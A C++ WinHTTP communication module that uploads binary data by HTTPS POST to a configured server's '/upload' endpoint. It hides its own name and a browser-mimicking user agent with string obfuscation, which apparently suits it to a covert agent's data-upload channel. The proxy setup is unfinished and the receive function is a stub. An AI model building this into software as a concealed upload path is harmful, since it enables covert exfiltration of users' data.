// src/communication/HttpComms.cpp
#include "communication/HttpComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/StringUtils.h"
#include "utils/NetworkUtils.h"
#include <winhttp.h>
#include <vector>
#include <random>
#include <cstdint>
#include <string>

#pragma comment(lib, "winhttp.lib")

// Obfuscated strings
static const auto OBF_HTTP_COMMS = OBFUSCATE("HttpComms");
static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

HttpComms::HttpComms(Configuration* config)
    : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}

HttpComms::~HttpComms() {
    Cleanup();
}

bool HttpComms::Initialize() {
    // Initialize WinHTTP session
    std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
    
    DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
    LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
    
    if (m_config->GetUseProxy()) {
        accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        std::string proxyStr = OBFUSCATE("http://proxy:8080");
        // Convert to wide string if needed
    }
    
    m_hSession = WinHttpOpen(
        userAgent.c_str(),
        accessType,
        proxyName,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!m_hSession) {
        LOG_ERROR("Failed to initialize WinHTTP session: " + std::to_string(GetLastError()));
        return false;
    }

    // Configure timeouts
    int timeout = m_config->GetTimeout();
    WinHttpSetTimeouts(
        m_hSession,
        timeout,
        timeout,
        timeout,
        timeout
    );

    // Parse server URL
    std::string url = m_config->GetServerUrl();
    
    // Convert to wide string for WinHTTP
    std::wstring wUrl(url.begin(), url.end());
    
    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse server URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);

    // Establish connection
    m_hConnect = WinHttpConnect(
        m_hSession,
        hostName.c_str(),
        urlComp.nPort,
        0
    );

    if (!m_hConnect) {
        LOG_ERROR("Failed to establish HTTP connection: " + std::to_string(GetLastError()));
        return false;
    }

    LOG_INFO("HTTP communication initialized successfully");
    return true;
}

bool HttpComms::SendData(const std::vector<uint8_t>& data) {
    if (!m_hConnect) {
        LOG_ERROR("HTTP connection not initialized");
        return false;
    }

    // Create HTTP request
    HINTERNET hRequest = WinHttpOpenRequest(
        m_hConnect,
        L"POST",
        L"/upload",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest) {
        LOG_ERROR("Failed to create HTTP request: " + std::to_string(GetLastError()));
        return false;
    }

    // Add headers
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
    
    std::wstring wHeaders(headers.begin(), headers.end());
    
    if (!WinHttpAddRequestHeaders(
        hRequest,
        wHeaders.c_str(),
        static_cast<DWORD>(wHeaders.length()),
        WINHTTP_ADDREQ_FLAG_ADD
    )) {
        LOG_WARN("Failed to add HTTP headers: " + std::to_string(GetLastError()));
    }

    // Send request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    )) {
        LOG_ERROR("Failed to send HTTP request: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        LOG_ERROR("Failed to receive HTTP response: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Check response status
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &size,
        NULL
    );

    bool success = (statusCode >= 200 && statusCode < 300);
    if (!success) {
        LOG_ERROR("HTTP request failed with status: " + std::to_string(statusCode));
    }

    WinHttpCloseHandle(hRequest);
    return success;
}

void HttpComms::Cleanup() {
    if (m_hConnect) {
        WinHttpCloseHandle(m_hConnect);
        m_hConnect = NULL;
    }
    if (m_hSession) {
        WinHttpCloseHandle(m_hSession);
        m_hSession = NULL;
    }
    
    LOG_DEBUG("HTTP communication cleaned up");
}

bool HttpComms::TestConnection() const {
    // Implement connection test logic
    return utils::NetworkUtils::CheckInternetConnection();
}

std::vector<uint8_t> HttpComms::ReceiveData() {
    // Implement HTTP data reception if needed
    return std::vector<uint8_t>();
}